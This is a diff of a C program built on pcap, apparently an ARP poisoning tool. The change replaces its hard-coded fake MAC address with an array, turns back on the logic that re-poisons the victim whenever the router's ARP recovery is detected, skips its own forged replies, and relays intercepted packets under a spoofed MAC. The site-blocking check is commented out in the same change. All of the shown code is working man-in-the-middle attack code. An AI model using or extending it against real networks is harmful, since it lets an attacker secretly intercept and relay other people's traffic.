@@ -187,23 +187,26 @@ int make_request(u_char* pdata, u_char* tip) {
 // copied from my arp_poison
 int make_sp_me(u_char* arp_data, u_char* targetip, u_char* req_data) {
 	int i;
+	u_char fakeMAC[6];
+	fakeMAC[0] = 0x48;
+	fakeMAC[1] = 0x45;
+	fakeMAC[2] = 0x20;
+	for (i = 0; i < 3; i++) {
+		fakeMAC[3 + i] = 'a';
+	}
 
-	// fake source mac (aa:aa:aa:aa:aa:aa)
-	for (i = 6; i < 12; i++) {
-		arp_data[i] = 'a';
+	// fake source mac (48:45:20:aa:aa:aa)
+	for (i = 0; i < 6; i++) {
+		arp_data[6+i] = fakeMAC[i];
 	}
 	// fake sender mac
 	for (i = 22; i < 28; i++) {
-		arp_data[i] = 'a';
+		arp_data[i] = fakeMAC[i-22];
 	}
 
 	// dst MAC (6-11) sender MAC (22-27)
 	if (my_MAC(&arp_data[0]) == 0) {
 		printf("Error : Writing my MAC address at packet ! \n");
-	}
-	// fake mac (aa:aa:aa:aa:aa:aa)
-	for (i = 6; i < 12; i++) {
-		arp_data[i] = 'a';
 	}
 	// sender IP (28-31)  --  fake to victim
 	if (gateway_IP(&arp_data[28]) == 0) {
@@ -223,14 +226,21 @@ int make_sp_me(u_char* arp_data, u_char* targetip, u_char* req_data) {
 // copied from my arp_poison
 int make_sp_router(u_char* arp_data, u_char* targetip, u_char* req_data) {
 	int i;
+	u_char fakeMAC[6];
+	fakeMAC[0] = 0x48;
+	fakeMAC[1] = 0x45;
+	fakeMAC[2] = 0x20;
+	for (i = 0; i < 3; i++) {
+		fakeMAC[3 + i] = 'a';
+	}
 
 	// fake source mac (aa:aa:aa:aa:aa:aa)
 	for (i = 6; i < 12; i++) {
-		arp_data[i] = 'a';
+		arp_data[i] = fakeMAC[i-6];
 	}
 	// fake sender mac
 	for (i = 22; i < 28; i++) {
-		arp_data[i] = 'a';
+		arp_data[i] = fakeMAC[i-22];
 	}
 	// target ip (38-41)
 	if (gateway_IP(&arp_data[38]) == 0) {
@@ -275,11 +285,17 @@ int main(int argc, char* argv[]) {
 	u_char block_data[ETH_len + IP_len + TCP_len + 8];
 	time_t local_tv_sec;
 	int count_reinfect = 0; // counter for check if they know that they are poisoned
-
+	u_char fakeMAC[6];
 	u_char myMAC[6];
-	u_char gatewayMAC[6]; // setting at line 373
+	u_char gatewayMAC[6]; // setting at line 379
 
 	my_MAC(myMAC);
+	fakeMAC[0] = 0x48;
+	fakeMAC[1] = 0x45;
+	fakeMAC[2] = 0x20;
+	for (i = 0; i < 3; i++) {
+		fakeMAC[3 + i] = 'a';
+	}
 
 	// reading mal_site.txt
 	fopen_s(&fp, "mal_site.txt", "r");
@@ -423,12 +439,19 @@ int main(int argc, char* argv[]) {
 		if (ntohs(*((unsigned short*)(&pkt_data[12]))) == 0x0806) {
 			count_reinfect++; // if arp packet is increased, then router and victim smell the spoofing
 							  // if arp -> check for recognizing it is arp recovery
-			/*
+			
 			if (ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002) { // reply
 																		// sender ip = victim ip ?
+				
+				// checking reply is mine (내가 한 reply인지 확인)///
+				chk = 1;
+				for (i = 0; i < 6; i++) {
+					chk &= (pkt_data[6 + i] == fakeMAC[i]);
+				}
+				if (chk) continue;
+				////////////////////////////////////////////////////
 				if ((((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)targetip)[0])) {
 					// target ip = router ?
-					//if( ( ((unsigned int*)(&pkt_data[38]))[0] == ((unsigned int*)gatewip)[0] ) ){
 					// !! target is recovering router !!
 					printf("Detected Recovering Router\n");
 					if (pcap_sendpacket(adhandle, arp_data_r, 42) != 0) {
@@ -448,21 +471,22 @@ int main(int argc, char* argv[]) {
 					printf(" -> Spoofing Victim again Finished\n");
 				}
 			}
-			*/
+			
+			
 		}
 
 		// relaying and blocking mal_site
 		else {
-			// if destination mac is aa:aa:aa:aa:aa:aa
+			// if destination mac is fakeMAC
 			chk = 1;
 			for (i = 0; i < 6; i++) {
-				chk &= (pkt_data[i] == 'a');
+				chk &= (pkt_data[i] == fakeMAC[i]);
 			}
 			if (chk) {
 				chkk = 1;
 				// determining who send this packet (chkk = 1 : me , chkk = 0 : router)
 				for (i = 6; i < 12; i++) {
-					chkk &= (pkt_data[i] == myMAC[i]);
+					chkk &= (pkt_data[i] == myMAC[i-6]);
 				}
 				if (chkk) { // my computer send this packet, so destination is router
 					for (i = 0; i < 6; i++) {
@@ -475,8 +499,8 @@ int main(int argc, char* argv[]) {
 					}
 				}
 				// source mac
-				for (; i < 12; i++) {
-					relaying_data[i] = 'a';
+				for (i = 0; i < 6; i++){
+					relaying_data[6+i] = fakeMAC[i];
 				}
 				// other contents are same as original packet
 				for (i = 12; i < (header->caplen); i++) {
@@ -485,6 +509,7 @@ int main(int argc, char* argv[]) {
 				
 				// checking this packet contains mal_site
 				for (i = 0; i < len; i++) {
+					/*
 					if (strstr(relaying_data, block[i])) {
 						local_tv_sec = header->ts.tv_sec;
 						localtime_s(&ltime, &local_tv_sec);
@@ -493,6 +518,7 @@ int main(int argc, char* argv[]) {
 						printf("%s | approach to \"%s\" blocked!\n", timestr,block[i]);
 						break;
 					}
+					*/
 				}
 
 				// if there is no mal_site, send packet to relay
